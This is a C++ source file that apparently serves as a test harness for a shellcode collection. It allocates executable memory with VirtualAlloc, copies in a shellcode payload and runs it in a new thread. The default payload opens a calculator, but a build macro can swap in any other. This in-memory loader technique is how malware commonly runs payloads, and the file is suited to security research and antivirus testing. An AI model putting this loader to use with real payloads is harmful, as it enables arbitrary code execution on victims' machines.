// This program's goal is to try to create a new process to execute a shellcode that will open a calculator

#include <windows.h>
#include <iostream>

#ifdef SHELLCODE_PATH
#include SHELLCODE_PATH
#else
#include "../../src/shellcodes/unobfuscated_calc.hpp"
#endif


int main()
{

#if DEBUG
	printf("Shellcode is located at %p\n", shellcode);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Allocate the memory
	void* memory = VirtualAlloc(nullptr,
								sizeof(shellcode),
								MEM_COMMIT,
								PAGE_EXECUTE_READWRITE);

	if (memory == nullptr)
	{
		return 1;
	}

#if DEBUG
	printf("Allocated memory at %p\n", memory);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Move the shellcode to the allocated memory
	memcpy(memory,
		   shellcode,
		   sizeof(shellcode));

#if DEBUG
	printf("Shellcode copied to memory\n");
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Create a thread pointing to the shellcode address
	HANDLE thread =	CreateThread(nullptr,
				 0,
				 (LPTHREAD_START_ROUTINE) memory,
				 nullptr,
				 0,
				 nullptr);

	if (thread == nullptr)
	{
		return 1;
	}

	// Wait for the thread to finish
	WaitForSingleObject(thread, INFINITE);

	return 0;
}
